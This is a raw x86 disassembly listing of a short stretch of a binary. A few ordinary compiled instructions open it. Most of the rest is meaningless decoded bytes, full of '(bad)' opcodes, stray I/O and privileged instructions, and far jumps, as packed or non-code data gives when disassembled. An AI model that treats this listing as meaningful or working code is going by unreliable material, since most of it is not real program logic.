  41a8eb:	mov    eax,DWORD PTR [ebp+0xc]
  41a8ee:	add    eax,DWORD PTR [ebp+0x8]
  41a8f1:	mov    DWORD PTR [ebp-0x10],eax
  41a8f4:	mov    eax,DWORD PTR [ebp-0x1c]
  41a8f7:	test   eax,eax
  41a8f9:	je     0x41bfdb
  41a8ff:	mov    DWORD PTR [ebp-0x24],esi
  41a902:	push   0xb
  41a904:	jmp    0x41ab39
  41a909:	rcl    dh,1
  41a90b:	xlat   BYTE PTR ds:[ebx]
  41a90c:	int3   
  41a90d:	aad    0xd1
  41a90f:	fcmovnu st,st(2)
  41a911:	ss (bad) 
  41a913:	inc    esp
  41a914:	xor    esi,0x9
  41a917:	popa   
  41a918:	jge    0x41a962
  41a91a:	aad    0x7f
  41a91c:	js     0x41a92e
  41a91e:	jle    0x41a998
  41a920:	js     0x41a8cd
  41a922:	mov    ch,0x80
  41a924:	loopne 0x41a99a
  41a926:	cmp    BYTE PTR [esi-0x67ef05ae],al
  41a92c:	jg     0x41a8f9
  41a92e:	adc    ecx,DWORD PTR [eax+0x230bbbf1]
  41a934:	int    0xf8
  41a936:	jge    0x41a937
  41a938:	mov    ebp,0x4274a365
  41a93d:	fdivr  DWORD PTR [ebx-0x4b212656]
  41a943:	jbe    0x41a8cf
  41a945:	xor    DWORD PTR [edx],edi
  41a947:	adc    BYTE PTR [esi-0x36],dh
  41a94a:	push   ecx
  41a94b:	push   ss
  41a94c:	pop    DWORD PTR [esi]
  41a94e:	je     0x41a94e
  41a950:	(bad)  
  41a951:	jbe    0x41a922
  41a953:	jne    0x41a915
  41a955:	mov    al,ds:0xf6147998
  41a95a:	add    BYTE PTR [ebx-0x40],bh
  41a95d:	loope  0x41a962
  41a95f:	mov    bh,0x58
  41a961:	jmp    0xb403:0x9abdd6ab
  41a968:	adc    al,0x25
  41a96a:	push   0x796d27ce
  41a96f:	scas   al,BYTE PTR es:[edi]
  41a970:	loope  0x41a9e7
  41a972:	pop    ebp
  41a973:	stc    
  41a974:	sbb    ch,BYTE PTR [esi-0x38a1230d]
  41a97a:	les    ecx,FWORD PTR [ecx+0x49223640]
  41a980:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a981:	or     dh,BYTE PTR [ebx]
  41a983:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a984:	jno    0x41a969
  41a986:	add    edx,eax
  41a988:	ror    DWORD PTR [edx],cl
  41a98a:	idiv   BYTE PTR [ebp+0x29]
  41a98d:	xchg   esi,eax
  41a98e:	addr16 jns 0x41aa05
  41a991:	inc    esp
  41a992:	aad    0x8e
  41a994:	call   0x10f5b6bd
  41a999:	xchg   ecx,eax
  41a99a:	add    BYTE PTR [edx],cl
  41a99c:	punpckhbw mm3,QWORD PTR [edx+0x75]
  41a9a0:	sbb    DWORD PTR [esi+0x1281a190],edx
  41a9a6:	mov    dh,0x8c
  41a9a8:	inc    ebp
  41a9a9:	mov    ds:0xf29a4098,eax
  41a9ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a9b0:	in     eax,0xa0
  41a9b2:	sub    al,0x41
  41a9b4:	add    ebx,DWORD PTR [edi+eax*4+0x5f]
  41a9b8:	lods   eax,DWORD PTR ds:[esi]
  41a9b9:	imul   esp,DWORD PTR [edi-0x64],0x36
  41a9bd:	mov    DWORD PTR [ebx],edx
  41a9bf:	sub    al,0xe9
  41a9c1:	lea    esi,[ecx-0x50ec80c6]
  41a9c7:	cmp    eax,0x1849cbc6
  41a9cc:	push   esi
  41a9cd:	sub    ah,BYTE PTR [edx-0x58]
  41a9d0:	addr16 xchg ecx,eax
  41a9d2:	inc    edi
  41a9d3:	pop    esp
  41a9d4:	sbb    esp,DWORD PTR [eax-0x80]
  41a9d7:	gs loopne 0x41aa27
  41a9da:	dec    edx
  41a9db:	pop    esi
  41a9dc:	dec    esp
  41a9dd:	mov    ah,0x6d
  41a9df:	ins    DWORD PTR es:[edi],dx
  41a9e0:	in     eax,0x3
  41a9e2:	pusha  
  41a9e3:	and    eax,0x1edd801c
  41a9e8:	sub    BYTE PTR [esi],dh
  41a9ea:	pusha  
  41a9eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a9ec:	inc    edi
  41a9ed:	es and al,0x6a
  41a9f0:	retf   
  41a9f1:	or     eax,0xa7671942
  41a9f6:	adc    dh,BYTE PTR [edx]
  41a9f8:	and    eax,0x7ff9e353
  41a9fd:	inc    ebp
  41a9fe:	sub    al,0xb5
  41aa00:	mov    ebx,0x9c81860a
  41aa05:	aas    
  41aa06:	inc    esp
  41aa07:	add    DWORD PTR gs:[ebp-0x722e839],ebp
  41aa0e:	jl     0x41aa7b
  41aa10:	xchg   edi,eax
  41aa11:	push   ebp
  41aa12:	or     eax,0x87321ac4
  41aa17:	cs mov ebp,edi
  41aa1a:	arpl   cx,di
  41aa1c:	stos   DWORD PTR es:[edi],eax
  41aa1d:	cs pop esp
  41aa1f:	in     al,dx
  41aa20:	xlat   BYTE PTR ds:[ebx]
  41aa21:	jle    0x41a9f4
  41aa23:	and    ch,0x47
  41aa26:	jecxz  0x41aa86
  41aa28:	outs   dx,BYTE PTR ds:[esi]
  41aa2a:	mov    DWORD PTR [ecx-0x3f7a3d99],esp
  41aa30:	test   BYTE PTR [edi+0x1f695a08],dl
  41aa36:	sbb    ecx,ebx
  41aa38:	add    BYTE PTR [edx+0x3],bl
  41aa3b:	add    ah,BYTE PTR ds:0xc73000dc
  41aa41:	ret    
  41aa42:	inc    eax
  41aa43:	xchg   ebp,eax
  41aa44:	lods   al,BYTE PTR ds:[esi]
  41aa45:	sbb    DWORD PTR [eax+ebx*4-0x5dc7b07],edx
  41aa4c:	sub    eax,0xb2005a83
  41aa51:	mov    cl,0x30
  41aa53:	test   ch,bl
  41aa55:	outs   dx,DWORD PTR ds:[esi]
  41aa56:	out    dx,eax
  41aa57:	mov    ebx,0xc842a237
  41aa5c:	in     al,dx
  41aa5d:	idiv   DWORD PTR [eax]
  41aa5f:	fidiv  DWORD PTR [ebx+0x3e08bdaa]
  41aa65:	dec    ebp
  41aa66:	or     al,BYTE PTR [ebx+eiz*8+0x63]
  41aa6a:	push   ebp
  41aa6b:	adc    edi,edi
  41aa6d:	loop   0x41aa39
  41aa6f:	xor    bl,bl
  41aa71:	inc    eax
  41aa72:	sub    BYTE PTR [ebp+ebp*4+0x25],bh
  41aa76:	cwde   
  41aa77:	into   
  41aa78:	and    DWORD PTR [ebx+0x52eff25d],ebx
  41aa7e:	fwait
  41aa7f:	daa    
  41aa80:	daa    
  41aa81:	test   esp,eax
  41aa83:	into   
  41aa84:	sbb    al,cl
  41aa86:	mov    ds:0x76b79c6e,al
  41aa8b:	sub    bh,BYTE PTR [esi+0x28]
  41aa8e:	jmp    0x41aa1e
  41aa90:	jno    0x41aa24
  41aa92:	pop    ebp
  41aa93:	sbb    al,0x8e
  41aa95:	xchg   ecx,eax
  41aa96:	test   eax,0x95de59d
  41aa9b:	jns    0x41aaa0
  41aa9d:	inc    ebp
  41aa9e:	jb     0x41aa5b
  41aaa0:	inc    ebp
  41aaa1:	es test eax,0x24f5547e
  41aaa7:	lock ja 0x41aabc
  41aaaa:	fisub  DWORD PTR [esi]
  41aaac:	mov    dl,bl
  41aaae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aaaf:	inc    esi
  41aab0:	rcl    ecx,0x11
  41aab3:	sub    eax,0xc8bbcb0b
  41aab8:	popa   
  41aab9:	push   edi
  41aaba:	rol    BYTE PTR [edx],cl
  41aabc:	cmp    edi,DWORD PTR [edx+edi*1]
  41aabf:	dec    eax
  41aac0:	xor    ebp,ebp
  41aac2:	ds int3 
  41aac4:	dec    eax
  41aac5:	(bad)  
  41aac6:	std    
  41aac7:	push   0x61
  41aac9:	aam    0x17
  41aacb:	shl    ah,1
  41aacd:	xor    esi,DWORD PTR [ecx]
  41aacf:	adc    BYTE PTR [esi+0x57],cl
  41aad2:	(bad)  
  41aad3:	sub    ebp,edx
  41aad5:	inc    ecx
  41aad6:	inc    esi
  41aad7:	cmp    DWORD PTR ds:0x344d6090,edx
  41aadd:	push   ds
  41aade:	xchg   esi,eax
  41aadf:	mov    ch,cl
  41aae1:	stos   DWORD PTR es:[edi],eax
  41aae2:	das    
  41aae3:	inc    ecx
  41aae4:	adc    DWORD PTR [edx+0x74b6973c],ebx
  41aaea:	mov    dh,0x27
  41aaec:	cmp    eax,0xe862ff55
  41aaf1:	cld    
  41aaf2:	(bad)  
  41aaf3:	cmp    eax,0x4c4b7b46
  41aaf8:	pop    ds
  41aaf9:	ins    BYTE PTR es:[di],dx
  41aafb:	rcl    BYTE PTR [eax],0x3b
  41aafe:	push   ebp
  41aaff:	ins    BYTE PTR es:[edi],dx
  41ab00:	pop    ebx
  41ab01:	iret   
  41ab02:	mov    bl,0xe0
  41ab04:	jns    0x41ab1c
  41ab06:	(bad)  
  41ab08:	iret   
  41ab09:	adc    edi,ebp
  41ab0b:	adc    ch,BYTE PTR [ecx-0x72]
  41ab0e:	push   cs
  41ab0f:	or     eax,0x97bf01c9
  41ab14:	fsubr  QWORD PTR [edx-0x78]
  41ab17:	sbb    eax,DWORD PTR [edi]
  41ab19:	push   edx
  41ab1a:	mov    ch,0xab
  41ab1c:	cdq    
  41ab1d:	xchg   esp,eax
  41ab1e:	jl     0x41aabd
  41ab20:	xchg   ecx,eax
  41ab21:	mov    bh,0x7f
  41ab23:	xchg   BYTE PTR [edi],bh
  41ab25:	js     0x41ab0f
  41ab27:	and    DWORD PTR [eax],0xffffffe7
  41ab2a:	fmul   DWORD PTR [ebp-0x79fe99bd]
  41ab30:	mov    ecx,0x77eb5232
  41ab35:	cwde   
  41ab36:	or     al,0x85
  41ab38:	push   0x59
  41ab3a:	push   0x5
  41ab3c:	dec    ecx
  41ab3d:	pop    ebx
  41ab3e:	jmp    0x41ad73
  41ab43:	rcl    bl,cl
  41ab45:	aas    
  41ab46:	leave  
  41ab47:	cmp    eax,0x48dbdad9
  41ab4c:	pushf  
  41ab4d:	mov    eax,ds:0xeefeedbe
  41ab52:	dec    ecx
  41ab53:	pusha  
  41ab54:	fstp   TBYTE PTR [edi+0x78]
  41ab57:	adc    BYTE PTR [esi+0x78],bh
  41ab5a:	js     0x41aaf6
  41ab5c:	mov    ah,0x60
  41ab5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab5f:	push   ebx
  41ab60:	xor    al,0xf9
  41ab62:	xor    DWORD PTR [edx+0x5b],edx
  41ab65:	cmp    eax,ebp
  41ab67:	xlat   BYTE PTR ds:[ebx]
  41ab68:	enter  0xede6,0xa
  41ab6c:	imul   esi,DWORD PTR [edi+0x2ec8c70a],0xcaf3974
  41ab76:	cmp    eax,0x5102704
  41ab7b:	(bad)  
  41ab7c:	in     eax,dx
  41ab7d:	rcl    esp,cl
  41ab7f:	leave  
  41ab80:	icebp  
  41ab81:	sub    BYTE PTR [eax],cl
  41ab83:	jecxz  0x41ab3b
  41ab85:	(bad)  
  41ab86:	in     al,0x8d
  41ab88:	pop    esi
  41ab89:	dec    ebx
  41ab8a:	jae    0x41ab1c
  41ab8c:	mov    ebp,0xc1ae699c
  41ab91:	sub    ah,ah
  41ab93:	jg     0x41ab45
  41ab95:	outs   dx,DWORD PTR ds:[esi]
  41ab96:	shr    BYTE PTR [eax+edx*2-0x2c3bd159],0x37
  41ab9e:	inc    ecx
  41ab9f:	xor    al,0xd3
  41aba1:	sahf   
  41aba2:	xchg   esp,eax
  41aba3:	push   ebp
  41aba4:	pop    ebp
  41aba5:	repnz out dx,eax
  41aba7:	jl     0x41abf8
  41aba9:	mov    cl,0x4e
  41abab:	cdq    
  41abac:	pop    ebx
  41abad:	(bad)  
  41abae:	jbe    0x41ac06
  41abb0:	shl    BYTE PTR [eax-0x2c],1
  41abb3:	sbb    edi,DWORD PTR [edi+eiz*2+0x60]
  41abb7:	adc    ebx,DWORD PTR [ebp-0x10]
  41abba:	popa   
  41abbb:	mov    ebx,esp
  41abbd:	sbb    eax,0x1249671a
  41abc2:	cwde   
  41abc3:	mov    ah,0x3f
  41abc5:	pop    ebp
  41abc6:	loop   0x41ab4f
  41abc8:	push   es
  41abc9:	mov    esp,db0
  41abcc:	fnsave [eax]
  41abce:	jmp    0xefa771be
  41abd3:	push   es
  41abd4:	mov    esp,0x895929c
  41abd9:	jecxz  0x41ac28
  41abdb:	xchg   edx,eax
  41abdc:	and    BYTE PTR [edx+0x15],bh
  41abdf:	and    eax,0x7723880
  41abe4:	retf   
  41abe5:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  41abe7:	daa    
  41abe8:	xor    eax,0x99c87c19
  41abed:	popf   
  41abee:	icebp  
  41abef:	cmp    dh,BYTE PTR [ebx-0x57ba0717]
  41abf5:	cmp    eax,DWORD PTR ds:0x78732a70
  41abfb:	mov    fs,ebx
  41abfd:	mov    bl,0x59
  41abff:	retf   
  41ac00:	out    0xa5,al
  41ac02:	xchg   ebp,eax
  41ac03:	ja     0x41ab9d
  41ac05:	cdq    
  41ac06:	pop    esp
  41ac07:	scas   al,BYTE PTR es:[edi]
  41ac08:	mov    esi,0xec0788e3
  41ac0d:	cli    
  41ac0e:	xor    ecx,ebx
  41ac10:	aad    0xe8
  41ac12:	loope  0x41abf2
  41ac14:	jbe    0x41abce
  41ac16:	fwait
  41ac17:	(bad)  
  41ac18:	mov    edi,0x6d3641af
  41ac1d:	loopne 0x41abd8
  41ac1f:	mov    DWORD PTR [edx+0x6fb39cf8],esi
  41ac25:	xchg   edi,eax
  41ac26:	dec    ebp
  41ac27:	sbb    DWORD PTR cs:[eax],ecx
  41ac2a:	cli    
  41ac2b:	inc    edi
  41ac2c:	rcr    DWORD PTR [ebx+0x17],0x52
  41ac30:	popf   
  41ac31:	popa   
  41ac32:	jb     0x41abc1
  41ac34:	mov    ah,0x3f
  41ac36:	sbb    bl,dh
  41ac38:	jp     0x41ac86
  41ac3a:	retf   
  41ac3b:	sbb    esi,DWORD PTR [esi+0x75]
  41ac3e:	dec    ebx
  41ac3f:	pop    esi
  41ac40:	add    eax,0x4c8fa840
  41ac45:	jmp    0xc8498757
  41ac4a:	fdivr  QWORD PTR [edx-0x7a]
  41ac4d:	or     BYTE PTR [edi],0xf9
  41ac50:	out    0x3d,eax
  41ac52:	pop    ds
  41ac53:	aaa    
  41ac54:	ret    0x3018
  41ac57:	into   
  41ac58:	aas    
  41ac59:	ja     0x41ac38
  41ac5b:	stc    
  41ac5c:	mov    DWORD PTR [ecx+0x570ce288],esp
  41ac62:	xchg   esi,eax
  41ac63:	ins    BYTE PTR es:[edi],dx
  41ac64:	addr16 jno 0x41accf
  41ac67:	jle    0x41ac2c
  41ac69:	cmp    al,0xc9
  41ac6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ac6c:	vpor   xmm5,xmm3,XMMWORD PTR [edx+0x4f272eb7]
  41ac74:	shr    DWORD PTR [ecx+0x75],cl
  41ac77:	push   eax
  41ac78:	(bad)  
  41ac79:	adc    eax,0xe01ebaeb
  41ac7e:	dec    eax
  41ac7f:	iret   
  41ac80:	jge    0x41acf5
  41ac82:	pop    edi
  41ac83:	dec    edx
  41ac84:	mov    ebx,0x7662bd1e
  41ac89:	sahf   
  41ac8a:	adc    dl,BYTE PTR [ebp-0x75]
  41ac8d:	(bad)  
  41ac8e:	mov    BYTE PTR [edi],0x44
  41ac91:	imul   ecx,DWORD PTR [ebp-0xe968a9b],0x8fe0d0a
  41ac9b:	loopne 0x41acca
  41ac9d:	xor    al,al
  41ac9f:	pop    ecx
  41aca0:	lods   eax,DWORD PTR ds:[esi]
  41aca1:	(bad)  
  41aca2:	mov    al,ds:0x764054b5
  41aca7:	push   ecx
  41aca8:	aam    0x5f
  41acaa:	or     esp,edi
  41acac:	jno    0x41acbb
  41acae:	sbb    al,0x16
  41acb0:	(bad)  
  41acb1:	aad    0x61
  41acb3:	xor    DWORD PTR [edx-0x41],ebx
  41acb6:	adc    ebx,esi
  41acb8:	push   ds
  41acb9:	sbb    edi,eax
  41acbb:	xchg   ecx,eax
  41acbc:	push   ebp
  41acbd:	in     al,dx
  41acbe:	xchg   esi,eax
  41acbf:	jmp    0x298:0x3e20eaf5
  41acc6:	sub    eax,0x303e5d16
  41accb:	mov    ds:0xfb472ee8,eax
  41acd0:	and    al,0x25
  41acd2:	sti    
  41acd3:	fs out dx,eax
  41acd5:	test   BYTE PTR [ecx-0x39],al
  41acd8:	in     eax,0xc4
  41acda:	jmp    0x3afd:0xb63ac2e3
  41ace1:	xchg   edx,eax
  41ace2:	sbb    eax,ebp
  41ace4:	stos   DWORD PTR es:[edi],eax
  41ace5:	adc    BYTE PTR [edx-0x75754e2e],al
  41aceb:	shl    BYTE PTR [edi-0x1c],1
  41acee:	in     al,0xbe
  41acf0:	pop    eax
  41acf1:	push   esp
  41acf2:	dec    ebx
  41acf3:	mov    eax,0x8b763a60
  41acf8:	mov    ebp,0x6ec8826f
  41acfd:	lock ds cli 
  41ad00:	pop    ebp
  41ad01:	iret   
  41ad02:	mov    ah,BYTE PTR [eax-0x6ef2d4a3]
  41ad08:	dec    ebx
  41ad09:	mov    al,0x31
  41ad0b:	mov    bh,0xc1
  41ad0d:	xor    BYTE PTR [ecx-0x28],cl
  41ad10:	pop    edx
  41ad11:	retf   
  41ad12:	cmp    eax,0xaef80f5f
  41ad17:	dec    eax
  41ad18:	dec    edx
  41ad19:	mov    DWORD PTR [esi],edi
  41ad1b:	xor    ebp,DWORD PTR [ecx-0x2a9af395]
  41ad21:	mov    edi,0xfcf77282
  41ad26:	in     eax,dx
  41ad27:	mov    al,ds:0xfac4475d
  41ad2c:	mov    bl,0x1d
  41ad2e:	or     BYTE PTR [ebx+0x66563f05],dh
  41ad34:	rcr    BYTE PTR [esi],0x8d
  41ad37:	jmp    0xba6:0x274444e7
  41ad3e:	fwait
  41ad3f:	(bad)  
  41ad40:	imul   ebp,ebx,0xffffff8d
  41ad43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad44:	fcmovbe st,st(7)
  41ad46:	and    eax,0xc2106dd2
  41ad4b:	cli    
  41ad4c:	inc    esp
  41ad4d:	scas   al,BYTE PTR es:[edi]
  41ad4e:	mov    dl,0x7
  41ad50:	jbe    0x41ad68
  41ad52:	inc    ebp
  41ad53:	dec    esp
  41ad54:	into   
  41ad55:	add    ah,BYTE PTR [edi]
  41ad57:	xchg   BYTE PTR [edx],dl
  41ad59:	mov    ds:0x65650eea,al
  41ad5e:	mov    WORD PTR [esi+0x30],es
  41ad61:	sti    
  41ad62:	pop    ecx
  41ad63:	add    ecx,0x2e328d47
  41ad69:	and    BYTE PTR [edi],al
  41ad6b:	cli    
  41ad6c:	xor    bl,BYTE PTR [ebx+0x7d104a67]
  41ad72:	add    al,0x87
  41ad74:	retf   
  41ad75:	sub    ebx,ecx
  41ad77:	jmp    0x41afac
  41ad7c:	ret    0xd1d7
  41ad7f:	aas    
  41ad80:	fxch   st(1)
  41ad82:	rcr    cl,cl
  41ad84:	mov    ds:0x46d25295,eax
  41ad89:	das    
  41ad8a:	jmp    0x41ad7b
  41ad8c:	js     0x41ad66
  41ad8e:	jg     0x41ae08
  41ad90:	adc    BYTE PTR [esi+0x78],bh
  41ad93:	js     0x41adfd
  41ad95:	or     eax,0xa42fed44
  41ad9a:	pushf  
  41ad9b:	mov    dl,0x29
  41ad9d:	xor    ah,ah
  41ad9f:	jle    0x41ad31
  41ada1:	jmp    0x912d9ed8
  41ada6:	stos   BYTE PTR es:[edi],al
  41ada7:	in     al,dx
  41ada8:	das    
  41ada9:	mov    ebx,0x334bc6f0
  41adae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41adaf:	push   edx
  41adb0:	inc    eax
  41adb1:	sti    
  41adb2:	popf   
  41adb3:	inc    eax
  41adb4:	int    0x37
  41adb6:	ins    BYTE PTR es:[edi],dx
  41adb7:	(bad)  
  41adb8:	adc    esi,DWORD PTR [edi+0x4d3931d6]
  41adbe:	test   eax,0xcc22c3d6
  41adc3:	int    0xe9
  41adc5:	fwait
  41adc6:	pop    ds
  41adc7:	dec    BYTE PTR [esi]
  41adc9:	ins    WORD PTR es:[edi],dx
  41adcb:	and    BYTE PTR [ecx+0x3c417e63],bl
  41add1:	sahf   
  41add2:	repnz out 0xf6,al
  41add5:	ds pop ebx
  41add7:	mov    ds:0x6278453f,eax
  41addc:	cs or  eax,0xe87d44a2
  41ade2:	loopne 0x41adec
  41ade4:	push   ss
  41ade5:	in     eax,dx
  41ade6:	loopne 0x41ad9f
  41ade8:	aad    0xfa
  41adea:	adc    BYTE PTR [esi+ecx*4+0x6e1533c8],0x81
  41adf2:	mov    cl,BYTE PTR [eax]
  41adf4:	mov    dl,0xe1
  41adf6:	jno    0x41ae37
  41adf8:	mov    es,WORD PTR [esi]
  41adfa:	pushf  
  41adfb:	gs push gs
  41adfe:	mov    al,ds:0xabc81789
  41ae03:	jmp    0x2f7e:0xe1348f46
  41ae0a:	test   DWORD PTR [edi+0x44eb72f3],edi
  41ae10:	rcl    DWORD PTR [ebp-0x7c],1
  41ae13:	test   DWORD PTR [ecx+ecx*2-0x2f],0x2ea86489
  41ae1b:	scas   eax,DWORD PTR es:[edi]
  41ae1c:	jecxz  0x41ae02
  41ae1e:	add    eax,0x446a97f2
  41ae23:	pop    edx
  41ae24:	stc    
  41ae25:	popf   
  41ae26:	bound  ebx,QWORD PTR [ebx]
  41ae28:	mov    ah,0x14
  41ae2a:	(bad)  
  41ae2b:	aad    0xf8
  41ae2d:	test   eax,0x72f35707
  41ae32:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  41ae34:	stos   DWORD PTR es:[edi],eax
  41ae35:	mov    edi,0x6873f53f
  41ae3a:	push   esp
  41ae3b:	ins    DWORD PTR es:[edi],dx
  41ae3c:	popf   
  41ae3d:	sbb    BYTE PTR ds:0x436715e,0x85
  41ae44:	ret    0xf4aa
  41ae47:	out    0xea,eax
  41ae49:	shr    edi,0xb
  41ae4c:	or     eax,0x9ef20c53
  41ae51:	mov    ds:0x4bc0967d,al
  41ae56:	jb     0x41ae19
  41ae58:	int    0x55
  41ae5a:	repz or DWORD PTR [ecx+0x188fd258],ebx
  41ae61:	rcr    BYTE PTR [esi+edi*2-0x76280d84],cl
  41ae68:	push   es
  41ae69:	icebp  
  41ae6a:	cmp    esi,DWORD PTR [esi-0xa]
  41ae6d:	mov    esp,DWORD PTR [edi]
  41ae6f:	cmp    al,0x2
  41ae71:	fsub   DWORD PTR [esi]
  41ae73:	mov    cs,WORD PTR ds:0x8df04827
  41ae79:	lds    esp,FWORD PTR [edi+0x5dd7996e]
  41ae7f:	xchg   DWORD PTR fs:[ebp+0xd],ebx
  41ae83:	xchg   esi,esp
  41ae85:	loopne 0x41af03
  41ae87:	push   0xb234883
  41ae8c:	add    eax,0xe09a8026
  41ae91:	cmc    
  41ae92:	add    BYTE PTR [ecx-0x53],al
  41ae95:	cdq    
  41ae96:	es mov ss,edi
  41ae99:	out    dx,al
  41ae9a:	pop    ds
  41ae9b:	push   edx
  41ae9c:	sahf   
  41ae9d:	into   
  41ae9e:	in     eax,0x85
  41aea0:	lock cmp eax,esp
  41aea3:	push   eax
  41aea4:	repz call 0x5166e80f
  41aeaa:	test   eax,0x7631fa74
  41aeaf:	shl    BYTE PTR [ebp-0x10e127a9],1
  41aeb5:	sub    DWORD PTR [edi-0x15695329],eax
  41aebb:	pop    esi
  41aebc:	jecxz  0x41ae76
  41aebe:	aad    0x3e
  41aec0:	pop    edx
  41aec1:	add    ch,BYTE PTR [esi+0x2deb9567]
  41aec7:	imul   esi,DWORD PTR [ebx-0x5b327dc0],0xbb7c793a
  41aed1:	mov    bl,0x65
  41aed3:	pop    ds
  41aed4:	jp     0x41aeae
  41aed6:	xor    bl,BYTE PTR [ecx]
  41aed8:	imul   ebp,DWORD PTR [esi],0x85009461
  41aede:	and    al,0x90
  41aee0:	enter  0x52fb,0x74
  41aee4:	stc    
  41aee5:	imul   ecx,DWORD PTR [eax+0x38],0x4b0e0bfa
  41aeec:	(bad)  
  41aeed:	and    al,0x98
  41aeef:	mov    esi,0x6fb0e3ed
  41aef4:	cs jp  0x41af57
  41aef7:	popf   
  41aef8:	shl    eax,cl
  41aefa:	outs   dx,BYTE PTR ds:[esi]
  41aefb:	or     DWORD PTR ds:0xa85560a9,esp
  41af01:	xchg   ebx,eax
  41af02:	imul   ch
  41af04:	and    DWORD PTR [edx],esp
  41af06:	adc    BYTE PTR es:[ecx+0x5],al
  41af0a:	add    ebp,edx
  41af0c:	mov    dl,0x44
  41af0e:	xor    BYTE PTR [esi+0x38e166e],ch
  41af14:	mov    ss,WORD PTR [ebp-0x36b6db5d]
  41af1a:	sbb    al,0xfd
  41af1c:	mov    dl,0xf
  41af1e:	xor    eax,DWORD PTR [ebx+0x2882c956]
  41af24:	cs inc esi
  41af26:	or     DWORD PTR [esp+ebx*1+0x41f6b1ae],esi
  41af2d:	cmp    esp,esi
  41af2f:	data16 out dx,al
  41af31:	jae    0x41af70
  41af33:	pusha  
  41af34:	mov    esi,0x92f37385
  41af39:	mov    al,0xb3
  41af3b:	es repnz cs and eax,0xa2ac058c
  41af43:	lock and eax,0x85ac6c6f
  41af49:	sbb    DWORD PTR [edi-0x741c225f],ecx
  41af4f:	sub    ch,BYTE PTR [ebp-0x17]
  41af52:	inc    ebx
  41af53:	inc    ebx
  41af54:	je     0x41aee0
  41af56:	cld    
  41af57:	jns    0x41af4f
  41af59:	shl    bh,cl
  41af5b:	sub    eax,0x473991f1
  41af60:	mov    ebx,0x1ea5459c
  41af65:	xor    bl,bh
  41af67:	sti    
  41af68:	icebp  
  41af69:	push   0xffffffe5
  41af6b:	loope  0x41af3b
  41af6d:	stos   DWORD PTR es:[edi],eax
  41af6e:	test   BYTE PTR [edi],dh
  41af70:	pop    edi
  41af71:	nop
  41af72:	pop    ebx
  41af73:	mov    ds:0x6f6879f6,al
  41af78:	imul   eax,DWORD PTR [ebx-0x22273bd2],0x76
  41af7f:	nop
  41af80:	pushf  
  41af81:	sahf   
  41af82:	add    eax,0xc877aa5f
  41af87:	mov    edi,0xdfe6ba71
  41af8c:	and    ebx,ebx
  41af8e:	lods   al,BYTE PTR ds:[esi]
  41af8f:	adc    cl,cl
  41af91:	mov    eax,ds:0xb9097b41
  41af96:	or     ebp,edx
  41af98:	arpl   WORD PTR [edx],bp
  41af9a:	xor    BYTE PTR [edi],cl
  41af9c:	dec    esi
  41af9d:	int3   
  41af9e:	jle    0x41af75
  41afa0:	scas   eax,DWORD PTR es:[edi]
  41afa1:	adc    al,0xae
  41afa3:	and    al,0x82
  41afa5:	fcmovnu st,st(7)
  41afa7:	in     eax,dx
  41afa8:	aas    
  41afa9:	or     ch,BYTE PTR [ebx-0x1634788a]
  41afaf:	xor    BYTE PTR [edx],al
  41afb1:	add    BYTE PTR [eax],al
  41afb3:	(bad)
  41afb6:	int    0xd4
  41afb8:	int    0xd9
  41afba:	fnstcw WORD PTR [edi-0x7ee7effd]
  41afc0:	mov    esp,eax
  41afc2:	dec    esi
  41afc3:	adc    dh,bl
  41afc5:	jg     0x41b03f
  41afc7:	adc    BYTE PTR [esi+0x78],bh
  41afca:	js     0x41af88
  41afcc:	pop    ss
  41afcd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41afce:	test   DWORD PTR [edi+0x6762e3eb],ecx
  41afd4:	dec    edx
  41afd5:	and    bl,bh
  41afd7:	ss pop edx
  41afd9:	cli    
  41afda:	xor    al,0x99
  41afdc:	jae    0x41b057
  41afde:	scas   eax,DWORD PTR es:[edi]
  41afdf:	jnp    0x41af70
  41afe1:	stc    
  41afe2:	out    dx,eax
  41afe3:	fwait
  41afe4:	push   0xffffffed
  41afe6:	sub    edi,DWORD PTR [ebp-0x70737d64]
  41afec:	icebp  
  41afed:	xchg   ecx,eax
  41afee:	mov    edx,0x6b7dbafb
  41aff3:	fmul   DWORD PTR [ecx-0x4d073e3f]
  41aff9:	cmp    ah,BYTE PTR [edx+edi*2]
  41affc:	push   edx
  41affd:	sub    cl,dl
  41afff:	and    eax,0x1b865f97
  41b004:	shl    BYTE PTR [edi],cl
  41b006:	loope  0x41b023
  41b008:	rcr    DWORD PTR [ecx+0x690726df],cl
  41b00e:	add    al,BYTE PTR [edx]
  41b010:	mov    esi,0x979854af
  41b015:	jp     0x41b02e
  41b017:	add    edi,DWORD PTR [ebx]
  41b019:	sub    eax,0xb10dbd69
  41b01e:	dec    ebp
  41b01f:	iret   
  41b020:	ja     0x41b060
  41b022:	sub    ebx,DWORD PTR [edi+ecx*8-0x72]
  41b026:	aaa    
  41b027:	dec    ecx
  41b028:	cwde   
  41b029:	fild   WORD PTR [ebp-0x1eeb3dbd]
  41b02f:	int    0xc1
  41b031:	and    cl,dl
  41b033:	cs nop
  41b035:	cdq    
  41b036:	jno    0x41afd4
  41b038:	mov    ah,0x4
  41b03a:	neg    BYTE PTR [eax+edi*4]
  41b03d:	cmp    DWORD PTR [eax],0xfdd097f7
  41b043:	std    
  41b044:	ds pop edx
  41b046:	(bad)  
  41b047:	mov    bl,0x98
  41b049:	nop
  41b04a:	loope  0x41b05c
  41b04c:	pusha  
  41b04d:	xor    BYTE PTR [eax-0x2a8c4c13],dh
  41b053:	outs   dx,BYTE PTR ds:[esi]
  41b054:	pop    ecx
  41b055:	pop    es
  41b056:	cmp    al,0x6
  41b058:	lods   eax,DWORD PTR ds:[esi]
  41b059:	repz xor BYTE PTR [ecx+esi*1+0x233466cf],cl
  41b061:	xchg   edi,eax
  41b062:	out    0x75,eax
  41b064:	dec    ecx
